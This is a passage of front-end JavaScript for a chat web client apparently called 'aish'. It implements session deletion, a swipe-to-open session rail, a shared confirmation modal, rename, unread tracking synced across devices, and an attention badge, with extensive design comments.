messagesEl.addEventListener("touchend", (event) => endTranscriptGesture(event));
messagesEl.addEventListener("touchcancel", (event) => endTranscriptGesture(event));

// ---- a chat that no longer exists ----------------------------------------
// [FORGET-SESSION-START]
// Everything this device was holding for a chat that is gone: a warm peek, a
// stashed DOM, a roster row — AND ITS CACHED COPY, which is the one that
// decides whether the row is still on screen. The rail paints from the mirror
// (opening it is a local act now, [ROSTER]), so a chat left in the mirror is a
// chat still IN THE LIST however cleanly the server deleted it, until some
// later sync happens to prune it — and never, if it was pinned.
//
// The SEEN STAMP STAYS, deliberately. It used to be dropped here, and that is
// what turned a stale row into an alarming one: unread is `output newer than
// this device's last look`, so forgetting the look made the leftover row
// UNREAD, which put the chat you had just deleted at the TOP of the list under
// "Needs you" and counted it on the badge. Learning that a chat is gone must
// never make it more prominent — and there is nothing to reclaim by forgetting,
// the map is capped (SEEN_MAX) and session names are never reused.
async function forgetSession(name) {
  if (!name) return;
  prefetched.delete(name);
  viewCache.delete(name);
  forgetAttention(name);
  await offlineForget(name);
}
// [FORGET-SESSION-END]

function onSessionGone(name) {
  forgetSession(name);
  showToast("that chat no longer exists");
  // We had already left for it ([PENDING-VIEW]) — don't leave the spinner
  // promising a transcript the server has just said does not exist.
  if (awaitingPaint === name) abandonPendingView("that chat no longer exists");
}

// Every client hears this now, not just the one that asked (#204): a chat
// deleted on the laptop used to sit on the phone's list until it refreshed,
// and tapping it opened a chat that no longer existed.
async function onSessionDeleted(event) {
  rosterBaseline(event.seq);
  showToast("chat deleted");
  // Repaint only AFTER the copy is gone: the rail reads the mirror, so a
  // render racing the eviction paints the chat straight back onto the list.
  await forgetSession(event.name);
  if (railIsOpen()) renderSessionsFromCache();
}


// ---- opening the session rail by swiping the transcript ------------------
// The gesture lives on the WHOLE transcript, not a left edge. An edge-only
// drawer is the platform default and it is what this shipped as first, but this
// app is navigated between chats constantly and a 24px strip is a fiddly
// one-handed target — the complaint was immediate and correct. The thing that
// made the edge tempting is transcript children that scroll sideways
// (unwrapped command output, code blocks, tables), and the fix for those is
// the one the old swipe pager already used on this exact surface: stand down
// when the pan STARTS inside one. That is a solved problem, not a reason to
// shrink the target.
//
// The DECISION is a pure function so it can be unit-tested without a DOM; the
// wiring above only feeds it live geometry.
// [RAILSWIPE-START]
const RAIL_AXIS_AT = 12;      // px of travel before the gesture picks an axis
const RAIL_COMMIT_AT = 0.28;  // fraction of the transcript width that commits
const RAIL_FLICK_PX = 48;     // a short, fast drag commits on speed instead
const RAIL_FLICK_MS = 260;

function railSwipeOpens(g) {
  // g: { dx, dy, width, ms, keyboardUp }
  if (g.keyboardUp) return false;             // the composer owns gestures then
  if (g.dx <= 0) return false;                // leftward opens nothing
  if (Math.abs(g.dy) > g.dx * 0.8) return false;  // dominant horizontal only
  if (g.dx > (g.width || 0) * RAIL_COMMIT_AT) return true;
  return g.dx >= RAIL_FLICK_PX && g.ms <= RAIL_FLICK_MS; // flick
}
// [RAILSWIPE-END]

// sessions
$("back-chip").onclick = () => toggleSessionRail();
$("session-chip").onclick = () => openSessionMenu();
$("console-btn").onclick = () => toggleConsole(); // global Quake console (#148)

$("connbar").onclick = () => reconnect();
$("offlinebar").onclick = () => reconnect(); // same affordance, one bar (#165)
$("composer-slot").onclick = () => pasteIntoComposer();
$("input-clear").onclick = () => clearComposer();

// [CONFIRM-START]
// ONE modal for every irreversible action (#202). It replaced the two-tap
// arm-then-confirm guard everywhere it existed, for two reasons.
//
// An armed control communicates by CHANGING ITSELF, and on a phone that change
// happens under the finger covering it. The chat menu's version got away with
// it by rewriting its LABEL ("Delete chat" → "Confirm delete"); the
// transcript's delete chip is an icon, so "armed" was a 17px glyph turning red
// beneath a thumb — you tap, nothing seems to happen, you tap again, and it is
// gone. Functionally one tap.
//
// And the confirming tap landed on the SAME PIXEL as the arming one, so a
// double-tap habit or a "did that register?" retap committed the action.
//
// The modal fixes both, and adds what neither guard had: it says WHAT HAPPENS.
// A verb and a red button tell you what you are doing, never what it costs —
// that the log is unlinked, that the offline copies go too, that nothing brings
// it back. Consequences belong in the question, not in the user's memory.
//
// Shared on purpose: a second bespoke confirmation is how two dialogs end up
// disagreeing about how serious the same action is.
let confirmAction = null; // what the open modal does if confirmed

function askConfirm({ title, body, verb, cancelVerb, action }) {
  confirmAction = action;
  $("confirm-title").textContent = title;
  $("confirm-body").textContent = body;
  $("confirm-ok").textContent = verb || "Delete";
  // Reset EVERY time, never only when overridden: the modal is shared, so a
  // label left behind by one caller silently mislabels the next one's escape.
  $("confirm-cancel").textContent = cancelVerb || "Cancel";
  $("confirm-modal").hidden = false;
  $("confirm-cancel").focus(); // the resting choice takes the keyboard, never the destructive one
}

function closeConfirm() {
  // Dismissing DROPS the pending action. An irreversible thing left
  // half-committed behind a closed dialog is exactly what this replaced.
  confirmAction = null;
  $("confirm-modal").hidden = true;
}

function runConfirmed() {
  const action = confirmAction;
  closeConfirm();
  if (action) action();
}

function confirmIsOpen() {
  return !$("confirm-modal").hidden;
}

$("confirm-ok").onclick = runConfirmed;
$("confirm-cancel").onclick = closeConfirm;
// Tapping the dim area outside the card cancels — the same as Cancel, never the
// action: a dismissal is not an answer.
$("confirm-modal").onclick = (e) => {
  if (e.target === $("confirm-modal")) closeConfirm();
};

// Deleting a chat is IRREVERSIBLE: the log file is unlinked, and the offline
// mirror drops server-deleted sessions on its next sync, so no copy survives.
// The name is captured when the question is ASKED, so an answer can never land
// on a chat the view moved to in between.
function askDeleteChat() {
  const name = currentSession;
  if (!name) return;
  askConfirm({
    title: "Delete this chat?",
    body:
      "Deletes the whole conversation — every message in it, and its log file " +
      "on the server. The copy on your devices is deleted at the next sync. " +
      "This cannot be undone.",
    verb: "Delete",
    // Answering "Delete" is not the same as the chat being deleted — the
    // request still has to arrive and be handled ([ACK-LEDGER]). Nothing to
    // undo here: the list is the claim, and it only drops the chat when the
    // server says it is gone ([FORGET-SESSION]).
    action: () => act({ type: "delete_session", name }, { label: "deleting that chat" }),
  });
}
// [CONFIRM-END]

// ---- session title menu -------------------------------------------------
// The tappable title opens a small menu of session actions (iOS Messages
// convention: settings live behind the title, not a floating overflow chip).
function openSessionMenu() {
  const menu = $("session-menu");
  $("wrap-state").textContent = document.body.classList.contains("wrap") ? "On" : "Off";
  refreshOfflinePinUi(); // async — the row shows "…" until the store answers
  // Measure while shown-but-invisible so width is known before centering.
  menu.style.visibility = "hidden";
  menu.hidden = false;
  const anchor = $("session-chip").getBoundingClientRect();
  const width = menu.offsetWidth;
  let left = anchor.left + anchor.width / 2 - width / 2;
  left = Math.max(12, Math.min(left, window.innerWidth - width - 12));
  menu.style.left = `${left}px`;
  menu.style.top = `${anchor.bottom + 6}px`;
  menu.style.visibility = "";
  $("backdrop").hidden = false;
}

// Inline rename: a small titled input anchored under the chat title, opened
// from the session menu. Optimistically updates the header; the server's
// session_renamed confirms and refreshes the drawer.
function openRenameBox() {
  $("session-menu").hidden = true;
  const box = $("rename-box");
  const input = $("rename-input");
  const current = $("session-title").textContent;
  input.value = current === "New chat" ? "" : current;
  box.style.visibility = "hidden";
  box.hidden = false;
  const anchor = $("session-chip").getBoundingClientRect();
  const width = box.offsetWidth;
  let left = anchor.left + anchor.width / 2 - width / 2;
  left = Math.max(12, Math.min(left, window.innerWidth - width - 12));
  box.style.left = `${left}px`;
  box.style.top = `${anchor.bottom + 6}px`;
  box.style.visibility = "";
  $("backdrop").hidden = false;
  input.focus();
  input.select();
}

$("rename-form").addEventListener("submit", (e) => {
  e.preventDefault();
  const title = $("rename-input").value.trim();
  if (!title) { $("rename-input").focus(); return; }
  // The header takes the new name at once, so it has to give it back if the
  // rename never lands — otherwise the chat answers to a name only this device
  // believes in, until some later repaint quietly disagrees.
  const previousTitle = $("session-title").textContent;
  if (currentSession) {
    act({ type: "rename_session", name: currentSession, title },
      { label: "the rename", lost: () => setTitle(previousTitle === "New chat" ? "" : previousTitle) });
  }
  setTitle(title); // optimistic; session_renamed reconfirms (and updates the drawer)
  closeSheets();
});
$("rename-cancel").onclick = () => closeSheets();

$("session-menu").addEventListener("click", (e) => {
  const item = e.target.closest(".menu-item");
  if (!item) return;
  // Deleting the current chat is unrecoverable, so it asks in the shared
  // confirmation modal ([CONFIRM]) — which also states what "delete" costs
  // here, something a red menu row never did.
  if (item.dataset.act === "delete") { closeSheets(); askDeleteChat(); return; }
  // Rename swaps the menu for an inline title field (keeps the backdrop) —
  // no blocking window.prompt, which would also trap automation.
  if (item.dataset.act === "rename") { openRenameBox(); return; }
  closeSheets(); // hides the menu + backdrop
  switch (item.dataset.act) {
    case "new": requestNewChat(); break;
    case "model": openModelSheet(""); break;
    case "cd": openDirSheet(); break;
    case "pin": toggleOfflinePin(); break;
    case "wrap": toggleWrap(); break;
    case "export": exportSessionPdf(); break;
    case "workspace": openSheet("workspace-sheet"); send({ type: "jobs" }); break;
    case "copylog": copyLogPath(); break;
    case "reconnect": reconnect(); break;
  }
});

// ---- unread: has this chat moved since I last looked at it? --------------
// [SEEN-START]
// The list is organised by ATTENTION, not by provenance. Chats used to be split
// into Recent / Automated tabs — a partition by who STARTED the chat — and the
// design kept arguing with itself about it: attention counters had to be
// computed for BOTH tabs so the hidden one could still flag things, and search
// collapsed the split entirely because it lies about relevance. Both are the
// same complaint. Provenance is a property worth SEEING (it is a row glyph now),
// but it is not how anyone navigates: what you want to know is whether a chat
// wants you. An email-triggered session holding an approval wants you exactly as
// much as your own chat that finished a long task while you were away, and a
// three-week-old triggered chat about a receipt is just an old chat.
//
// "Unread" belongs to the OWNER, not to this screen (#232). It used to be the
// other way — each browser kept its own map and it never left, on the reasoning
// that "I looked at it" is a fact about a screen — and for a product with many
// users that is right. aish has one owner and one pair of eyes: a chat read on
// the phone whose dot is still on the laptop is the app making a false claim
// about the person using it, and the attention band, whose entire value is
// being short and true, fills up with chats they already know about.
//
// So the ledger is the server's and this map is a CACHE plus an OUTBOX: it is
// written optimistically the instant a chat is opened (that is what makes
// reading one offline feel immediate, and what lets the rail paint with no
// socket at all), and reconciled with the server's whenever there is one.
//
// Both directions merge by MAX, and everything rests on that. A stamp only
// moves forward, so arrival order does not matter, a duplicate costs nothing, a
// re-send is free, and nothing can ever UN-see a chat ([FORGET-SESSION] is
// where that last tried to happen). It is also why marking seen needs no
// receipt ([ACK-LEDGER]): the repair for a lost mark is the next connect, which
// re-offers it, and re-offering can only ever be right.
//
// The floor (`since`) stays a fact about THIS device, deliberately. It exists
// so a new phone does not render the whole archive unread, which is a claim
// about what this screen has had a chance to show — and it can only ever move
// something toward READ, never resurrect a dot.
const SEEN_KEY = "aish-seen";
const SEEN_MAX = 300; // names kept; oldest views dropped first — matches aish/seen.py
let seenAt = {};      // name → ms the OWNER last read it (server's ledger, cached)
let seenSince = 0;    // this device started tracking here; older activity is read
let pendingSeen = {}; // marks the server has not confirmed yet — offered on connect
// The server's clock minus this device's, in ms. Every stamp unread compares —
// a row's last output, the owner's last look — is written by the server now, so
// a device with a wrong clock must not stamp its own optimistic "I read this"
// in its own time and hide an answer it never saw. Zero until a hello says
// otherwise, which is exactly the old behaviour.
let clockSkew = 0;

function saveSeen() {
  try {
    localStorage.setItem(SEEN_KEY, JSON.stringify({
      at: seenAt, since: seenSince, pending: pendingSeen,
    }));
  } catch { /* private mode: unread degrades to in-memory only */ }
}

(function loadSeen() {
  try {
    const raw = JSON.parse(localStorage.getItem(SEEN_KEY));
    if (raw && raw.at && raw.since) {
      seenAt = raw.at;
      seenSince = raw.since;
      // No `pending` key means this map was written by a build that kept
      // unread to itself. Everything in it is therefore unknown to the server,
      // and offering the lot is what SEEDS the ledger from whichever device
      // connects first — the upgrade migrates itself, with no flag to forget.
      pendingSeen = raw.pending || { ...seenAt };
      return;
    }
  } catch { /* private mode / corrupt — fall through to a fresh floor */ }
  seenSince = Date.now();
  saveSeen();
})();

// The server's clock, in this device's terms. Used for the optimistic stamp
// that stands until the ledger echoes back.
function serverNow() {
  return Date.now() + clockSkew;
}

// The ONLY writer of the seen map. Called from [SESSION-ENTER], because "the
// view is now chat X" and "this device has looked at chat X" are the same event
// — putting it there is what keeps a socket hello, a mirror read and the boot
// paint from each having to remember it separately.
function markSeen(name) {
  if (!name) return;
  const at = serverNow();
  if (at <= (seenAt[name] || 0)) return; // monotonic: a stamp only moves forward
  seenAt[name] = at;
  pendingSeen[name] = at;
  trimSeen();
  saveSeen();
  refreshBadge(); // reading a chat drops it from the count HERE, not a round trip later
  flushSeen();    // …and off the OTHER device's count, as soon as it can be told
}

// Fold the server's ledger in. Max, not replace: a mark this device made after
// the message was sent must survive it, or the chat you just opened flickers
// back to unread when an older stamp for it arrives from somewhere else.
// A stamp the server confirms is no longer pending — that is what stops the
// outbox growing forever on a device that reads a lot.
function applySeenMarks(seen) {
  if (!seen) return;
  let moved = false;
  for (const [name, at] of Object.entries(seen)) {
    const ms = Number(at) * 1000; // the ledger is in epoch SECONDS
    if (!ms) continue;
    if (ms > (seenAt[name] || 0)) { seenAt[name] = ms; moved = true; }
    if (pendingSeen[name] && pendingSeen[name] <= ms) delete pendingSeen[name];
  }
  trimSeen();
  saveSeen();
  if (moved) {
    refreshBadge();
    if (railIsOpen()) renderSessionsFromCache();
  }
}

// Hand over what the server has not confirmed, and on a connect ask for the
// whole ledger back — one message, both directions. Deliberately NOT `send()`,
// which toasts when the socket is down: marking a chat read offline is a normal
// thing to do, and the outbox is what carries it across.
function flushSeen(full) {
  const marks = {};
  for (const [name, at] of Object.entries(pendingSeen)) marks[name] = at / 1000;
  if (!full && !Object.keys(marks).length) return;
  if (!ws || ws.readyState !== WebSocket.OPEN) return;
  ws.send(JSON.stringify({ type: "seen", marks, full: Boolean(full) }));
}

// A hello: adopt the server's clock, then reconcile. Both halves belong to a
// CONNECT, not to a session switch — a hello also arrives on every switch, and
// the ledger is not per-chat.
function syncSeen(serverSeconds) {
  if (Number(serverSeconds)) clockSkew = Number(serverSeconds) * 1000 - Date.now();
  flushSeen(true);
}

// The answer to a `full` sync: the whole ledger, and the clock it was stamped
// in. Re-adopting the clock here rather than only at hello keeps the two facts
// arriving together — the stamps and the frame they mean anything in.
function onSeenLedger(event) {
  if (Number(event.now)) clockSkew = Number(event.now) * 1000 - Date.now();
  applySeenMarks(event.seen);
}

function trimSeen() {
  const names = Object.keys(seenAt);
  if (names.length <= SEEN_MAX) return;
  names.sort((a, b) => seenAt[b] - seenAt[a]);
  for (const stale of names.slice(SEEN_MAX)) {
    delete seenAt[stale];
    delete pendingSeen[stale];
  }
}

// PURE: the whole unread decision, testable with no DOM and no clock. `current`
// is part of it rather than a caller's afterthought — the chat on screen can
// never be unread, however much activity it produces while you watch it.
function sessionUnread(info, state) {
  if (!info || !info.name || info.name === state.current) return false;
  // OUTPUT, not activity (#203). `ts` answers "when did anything happen here",
  // which is the right stamp to ORDER by — a chat mid-turn really is the most
  // recent thing there is — and the wrong one to call unread by: every
  // thinking step a chat took moved it past this device's last look, so a chat
  // that was quietly working marked itself unread with nothing new to show.
  // `out` is the last thing that went into the CONVERSATION (`_is_output`).
  // Absent means the server or the mirror row predates the split, and then the
  // old stamp is still the best answer there is — never zero, which would read
  // as "nothing here is ever new".
  const at = (Number(info.out) || Number(info.ts) || 0) * 1000; // epoch SECONDS
  if (!at) return false;
  return at > Math.max(state.seen[info.name] || 0, state.since);
}
// [SEEN-END]

// SESSIONS_PARTITION_START
// One list, four bands, in the order you act on them:
//
//   Needs you  — held for approval, or OUTPUT you haven't seen. The only
//                band that is about you rather than about the chat, and the
//                reason the tabs are gone: it cuts ACROSS provenance.
//   Active now — running. Worth seeing, but it isn't asking for anything.
//   Pinned     — chats you said you care about, which recency would sink.
//   (rest)     — everything else, in date buckets.
//
// A session appears in exactly one band. Everything below is pure: it takes
// rows in and returns rows out, so the sectioning is unit-testable.

// The ONE "does this chat want me" predicate. The rail bands with it and the
// attention badge counts with it, so a chat can never sit in "Needs you"
// without being counted, or be counted without appearing there ([ATTENTION]).
//
// LIVENESS OUTRANKS THE STAMP. A chat that is WORKING is not asking for
// anything — it is `Active now`, and it will say so itself when it finishes or
// stops for you, both of which this predicate can already see. So a running
// chat is never `Needs you`, even when an EARLIER turn's output is genuinely
// unread: the row keeps its dot and says so, it just does not send you
// somewhere that has nothing for you yet.
//
// It used to have a second job. "Unread" was derived from last ACTIVITY, and a
// running turn is activity — every tool step moved the stamp — so a chat that
// was merely thinking kept re-crossing the unread line and landing here. That
// is fixed where it belonged, in `sessionUnread`, which now reads the last
// OUTPUT (#203). The guard below is no longer load-bearing against steps; it
// stands on its own meaning.
function needsYou(info, state) {
  if (info.state === "waiting") return true;   // stopped; it cannot go on without you
  if (info.state === "running") return false;  // working; not asking for anything
  return sessionUnread(info, state);
}

function partitionSessions(sessions, state) {
  const bands = { needsYou: [], active: [], pinned: [], rest: [] };
  const counts = { waiting: 0, running: 0, unread: 0 };
  for (const info of sessions) {
    const unread = sessionUnread(info, state);
    if (info.state === "waiting") counts.waiting++;
    if (info.state === "running") counts.running++;
    if (unread) counts.unread++;
    if (needsYou(info, state)) bands.needsYou.push(info);
    else if (info.state === "running") bands.active.push(info);
    else if (info.pinned) bands.pinned.push(info);
    else bands.rest.push(info);
  }
  return { bands, counts };
}
// SESSIONS_PARTITION_END

// ---- attention badge ----------------------------------------------------
// [ATTENTION-START]
// The durable count on the top-bar rail button: how many chats OTHER than the
// one on screen want you. It is the same question the rail's "Needs you" band
// answers, and that is exactly why it must not be answered twice.
//
// It used to be. The badge was written in two places — a `session_state` push
// ADDED a name, a `session_list` REPLACED the whole set — and a session_list is
// only ever requested when the rail is opened. So the badge's ground truth was
// refreshed by the act of opening the very list that would have shown you the
// answer, and between rail opens it drifted in both directions: reading a chat
// never decremented it (it counted chats you had already read), a background
// chat stopping for approval never incremented it (it missed the one thing that
// most literally needs you), and a reload started it EMPTY however many chats
// were waiting. Whichever way it was wrong, opening the rail refreshed it — so
// the number you acted on and the list you checked it against could never be
// caught disagreeing (#203).
//
// The shape that fixes it: the badge is a PURE FUNCTION of (rows, seen map,
// chat on screen), recomputed by its single owner whenever any of the three
// moves. Rows arrive from the server three ways — the session_list the rail
// requests, the recency rows every hello already carries (so a boot, a
// reconnect and a switch all re-derive it for free), and a pushed
// `session_state` for one chat. The seen map moves when you read a chat, which
// decrements the badge on the tap, with no round trip (L7).
//
// The MIRROR is deliberately not a source (L4): its rows carry a lagging `ts`
// and cannot see liveness at all (`state: ""`), so a cached list painting the
// rail must leave the badge alone rather than briefly claim a count it is not
// entitled to. The traffic runs the OTHER way instead — see `railRows`.
const attentionSessions = new Set();
let attentionRows = []; // last AUTHORITATIVE rows; the mirror's never land here

// Rows from the server, wholesale (a session_list, or a hello's recency list).
// Kept WHOLE, not reduced to the three fields the count reads: these are the
// best rows this device holds, and `railRows` renders them when the mirror
// cannot.
function setAttentionRows(rows) {
  attentionRows = (rows || []).filter((info) => info && info.name).map((info) => ({ ...info }));
  refreshBadge();
}

// One chat's state, pushed while you are elsewhere. Stamped with the SERVER's
// clock — the instant the transition was published, carried on the event
// (#232). It used to be stamped here, on the grounds that `sessionUnread`
// compares it against the seen map and that map was this device's clock too.
// That reasoning ended when the ledger became the owner's: the last-output
// stamp and the last-look stamp have to be in one clock, and only one of them
// can be. A server too old to send it falls back to this device's, corrected
// by whatever skew the hello reported — which is the old behaviour when there
// is none. The push carries a title, so a chat this device has never listed is
// still renderable when the count names it. One pushed row, applied WHOLE — a
// row, never a patch, so a duplicate costs nothing and a missed one is repaired
// by the next row for that chat.
function noteAttention(pushed, at) {
  const name = pushed && pushed.name;
  if (!name) return;
  const now = Number(at) || serverNow() / 1000;
  // A push announcing a chat has STOPPED — finished, or holding — is announcing
  // that something landed in it, so it moves the OUTPUT stamp too. Without
  // that, unread would go on comparing against whatever the last list said and
  // a background turn's answer would show no dot until the next one arrived
  // (#203). A `running` push says only that work started: `ts` moves, `out`
  // does not — the same distinction the stamps exist to draw.
  //
  // WHEN it last spoke is the SERVER's fact when the row states it (#275).
  // This used to be inferred from the row's arrival, which is not the same
  // question and is only accidentally the same answer: it is right for the
  // case above and wrong for every other reason a row gets published — a
  // rename on another device, a chat being loaded — each of which announced
  // output that never happened and raised a dot for it. Kept as the fallback,
  // because a server too old to send `out` still needs the #203 case to work,
  // and because a row that has never spoken sends nothing to prefer.
  const spoke = Number(pushed.out) || 0;
  const stamps = pushed.state === "running"
    ? { ts: now }
    : { ts: now, out: spoke || now };
  // Empty is "no opinion", not "it is empty now": a row whose derivation had
  // nothing to say must not blank a preview or a title this device can still
  // show. Every field the server DOES have an opinion about wins.
  const known = { state: pushed.state || "" };
  for (const field of ["title", "snippet", "origin", "cwd"]) {
    if (pushed[field]) known[field] = pushed[field];
  }
  const row = attentionRows.find((info) => info.name === name);
  if (row) Object.assign(row, known, stamps);
  else attentionRows.push({ name, ...known, ...stamps });
  refreshBadge();
}

// THE COUNT'S OWN ROWS ARE ALWAYS RENDERABLE. This is the other half of the
// fix above, and without it the first half reads as a worse bug than the one it
// replaced (#203 follow-up).
//
// The rail paints from the offline mirror FIRST — that is what makes a swipe
// instant and what makes it work with no socket at all. But a mirror row cannot
// carry liveness (`state: ""`, by its own admission) and its `ts` is as old as
// the last sync. So a rail painted from the mirror alone has NO `Active now`
// band — it structurally cannot know a chat is running — and can miss the very
// chat the count is counting, whose stamp moved after the last sync. Once the
// count became authoritative and the list did not, the two visibly disagreed:
// the badge said 1 and the list you opened to answer it was empty.
//
// It is not a race you can win by waiting. On a phone the socket is usually
// still reconnecting when the rail opens, and `requestSessions` deliberately
// does not even ASK while it is down — so the mismatch lasts as long as the
// reconnect does.
//
// So the authoritative rows are laid OVER the cached ones for the two facts
// that decide a band, and any the mirror has never synced are appended rather
// than dropped: the count can never name a chat that is nowhere on screen. The
// mirror keeps everything the server row has no opinion about (snippet, cwd,
// pin). Search is exempt from the APPEND half only — ranked results are an
// answer to a question, and a row that does not match it is not an omission.
function railRows(cached, searching) {
  const live = new Map(attentionRows.map((info) => [info.name, info]));
  const merged = (cached || []).map((row) => {
    const known = live.get(row.name);
    if (!known) return row;
    live.delete(row.name);
    return {
      ...row,
      state: known.state || "",
      ts: Math.max(Number(known.ts) || 0, Number(row.ts) || 0),
      out: Math.max(Number(known.out) || 0, Number(row.out) || 0),
      // The server's preview is fresher than the mirror's whenever it has one:
      // it derives from the conversation this process is holding, so it moves
      // with the turn rather than with the last sync.
      title: known.title || row.title || "",
      snippet: known.snippet || row.snippet || "",
    };
  });
  if (searching) return merged;
  for (const known of live.values()) merged.push({ ...known, snippet: "", cwd: "" });
  // The bands below `Needs you` are date buckets, which only read as buckets
  // while the rows descend — an appended row would otherwise land under
  // whatever heading happened to be open when it was pushed on.
  merged.sort((a, b) => (Number(b.ts) || 0) - (Number(a.ts) || 0));
  return merged;
}

// A chat that no longer exists must leave the count with it — the roster is
// the only thing that would otherwise go on naming it.
function forgetAttention(name) {
  if (!name) return;
  attentionRows = attentionRows.filter((info) => info.name !== name);
  refreshBadge();
}

function refreshBadge() {
  const state = { seen: seenAt, since: seenSince, current: currentSession };
  attentionSessions.clear();
  for (const info of attentionRows) {
    // The chat on screen is never counted, whatever its state: an approval it
    // is holding is a card in front of you, not somewhere else to go. This is
    // the same rule `sessionUnread` already applies, extended to liveness.
    if (info.name !== currentSession && needsYou(info, state)) {
      attentionSessions.add(info.name);
    }
  }
  const badge = $("back-badge");
  if (attentionSessions.size) {
    badge.textContent = String(attentionSessions.size);
    badge.hidden = false;
  } else {
    badge.hidden = true;
  }
}
// [ATTENTION-END]

let lastSessionEvent = null; // last session_list, so re-renders work offline

// The list is rendered from the local mirror FIRST and replaced by the server's
// answer when it arrives. Online that just means the rail paints instantly
// instead of after a round trip; offline it is the only source, and search
// keeps working because the ranking is a port of the server's own tiers
// (offlineRank) rather than a different, weaker matcher.
//
// What it paints is the mirror UNDER the best rows this device holds
// (`railRows`) — a mirror row cannot see liveness, so on its own it renders a
// rail with no `Active now` band and no sign of whatever the count is counting.
async function renderOfflineSessions(query) {
  const metas = await offlineList();
  const found = offlineRanked(metas || [], query || "");
  const cached = found.sessions.map((meta) => ({
    name: meta.name,
    title: meta.title,
    // The line the match is ON, when there is one — same rule as the server's
    // rows (`SessionLog._match_row`), so a row does not change its story when
    // the authoritative list lands over the cached one.
    snippet: offlineMatchLine(meta, found.words) || meta.snippet,
    ts: meta.ts,
    out: meta.out || 0, // last output as of the last sync (#203)
    state: "", // liveness is a server fact; a mirror can only lie about it
    cwd: "",
    origin: meta.origin,
    pinned: meta.pinned,
  }));
  // Not `metas.length`: a device that has connected but never finished a sync
  // still has rows worth painting, and they are the ones the count names.
  const sessions = railRows(cached, Boolean((query || "").trim()));
  if (!sessions.length) return false;
  renderSessions({
    type: "session_list",
    current: currentSession,
    fromCache: true,
    approx: found.approximate,
    sessions,
  });
  return true;
}

// Paint the rail, and ask the server ONLY when asking would tell us something.
//
// This used to ask every time — on every rail open, drag, dock and hello — and
// that was the refresh mechanism: the list was only ever as current as the
// last time you opened it. With the roster published ([ROSTER]) the client is
// already current, so opening the rail is a local act and should cost no round
// trip (L7). Two things still genuinely need the server:
//
//   a SEARCH — a ranked answer over every message, which no local state holds;
//   an INCOMPLETE roster — a fresh connection knows only the recency head the
//     hello carried, and a reconnect knows it missed deltas it can never be
//     sent again. Both are `rosterComplete === false`, and both are repaired
//     by exactly one list.
//
// Take that guard away and the poll comes back; leave the roster's staleness
// implicit and this becomes a client that quietly shows old rows forever.
function requestSessions(query) {
  // The server's rows are decorated with pin state from the in-memory mirror,
  // so make sure it is current before the response lands — otherwise the
  // pinned band silently empties in the window after a reload.
  offlineRefreshMetaMap();
  renderOfflineSessions(query);
  const searching = Boolean((query || "").trim());
  if (rosterComplete && !searching) return;
  // Don't call send() while offline: its toast would fire on every keystroke
  // for a condition the offline bar already states.
  if (ws && ws.readyState === WebSocket.OPEN) send({ type: "sessions", query });
}

$("sessions-search").addEventListener(
  "input",
  debounce(() => requestSessions($("sessions-search").value), 150)
);

// ---- the session rail ----------------------------------------------------
// [RAIL-START]
// The sessions list is a LEFT SLIDE-OVER, not a full screen — and that is
// structural, not cosmetic. At a wide viewport the very same panel docks open
// as a permanent sidebar, so phone and desktop run ONE navigation model at two
// widths; a full-screen list would be a separate SCREEN, i.e. a second model
// that would have to be reconciled with the first later. The sliver of chat
// left visible behind it does three jobs a full screen cannot: it says "this is
// temporary, you are still in that chat", it gives a tap-to-dismiss target that
// isn't a back button, and it makes obvious that the transcript underneath is
// untouched.
//
// There is deliberately no drag-to-CLOSE on the list: a leftward drag on a row
// is already swipe-to-delete, and two recognizers on one surface is exactly the
// collision that cost #169 its per-row delete. Closing is the scrim, the button,
// or Escape.
const RAIL_DOCK_MIN = 900; // px of viewport width at which the rail docks open

// Docked is TWO facts, not one. `railDocked()` is the viewport's: there is room
// for a sidebar. `railFiledAway()` is the OWNER's: they have put it away on this
// screen, and want the whole window for the chat.
//
// Only the width used to count, and the consequence was a dead control — the
// topbar's chats button and ⌘O both route to `closeSessionRail`, which refuses
// while docked, so on the only screens wide enough to dock there was no way to
// hide the list at all. The two facts are deliberately separate writers: this
// preference is written ONLY by the toggle and by an explicit open, never by
// `closeSessionRail` — that function is the slide-over's dismiss (the scrim,
// Escape, picking a chat) and if it filed the sidebar away, every tap on a chat
// row would close the sidebar on desktop.
//
// It lives in localStorage rather than on the server because it is a fact about
// this SCREEN — the laptop's sidebar has nothing to say about the phone's.
const RAIL_HIDDEN_KEY = "aish-rail-hidden";

function railDocked() { return innerWidth >= RAIL_DOCK_MIN; }
function railIsOpen() { return document.body.classList.contains("rail-open"); }
function railFiledAway() {
  try { return localStorage.getItem(RAIL_HIDDEN_KEY) === "1"; } catch (e) { return false; }
}
function setRailFiledAway(away) {
  try {
    if (away) localStorage.setItem(RAIL_HIDDEN_KEY, "1");
    else localStorage.removeItem(RAIL_HIDDEN_KEY);
  } catch (e) { /* private mode: the sidebar simply comes back next load */ }
}
function railWidth() {
  return $("session-rail").offsetWidth || Math.min(innerWidth * 0.86, 380);
}

function openSessionRail(query = "") {
  // An explicit open is the owner asking for the list, so it unfiles a sidebar
  // they had put away — /resume and ⌘O must be able to bring it back.
  if (railDocked()) setRailFiledAway(false);
  // Whatever else owns the screen stands down first — the rail is not a sheet
  // and does not stack with one. DOCKED it is not a mode and does not overlap
  // anything (the sheets are inset beside it), so there it stands nothing down:
  // showing the sidebar must not close the dossier you opened it to compare.
  if (!railDocked()) {
    for (const sheet of document.querySelectorAll(".sheet")) sheet.hidden = true;
    for (const menu of document.querySelectorAll(".popover-menu")) menu.hidden = true;
    $("backdrop").hidden = true;
  }
  document.body.classList.remove("rail-dragging");
  document.body.classList.add("rail-open");
  clearRailDragStyles();
  syncRailToggle();
  $("sessions-search").value = query;
  // Auto-focus only where a hardware keyboard is likely: on touch devices
  // focusing would throw the on-screen keyboard over the list before the user
  // has even seen it — there, browsing is the common case and a tap on the
  // field opts into searching.
  if (FINE_POINTER) {
    // Focus only after layout settles: focusing synchronously lets iOS measure
    // the input at its pre-layout position and pan the whole layout absurdly
    // far to "reveal" it (#24). preventScroll stops the browser's own reveal.
    requestAnimationFrame(() =>
      requestAnimationFrame(() => {
        $("sessions-search").focus({ preventScroll: true });
        setTimeout(() => reportViewport("search-focused"), 600);
      })
    );
  }
  requestSessions(query);
}

// Dismissing the SLIDE-OVER: the scrim, Escape, picking a chat, starting a new
// one. Docked, none of those mean "put the sidebar away" — they are the ordinary
// business of a list that is simply always there — so it still refuses, and the
// owner's preference is untouched.
function closeSessionRail() {
  if (railDocked()) return; // docked open is its resting state, not a mode
  hideRail();
}

// Putting the SIDEBAR away: the one deliberate act, and the only writer of the
// preference in this direction.
function fileRailAway() {
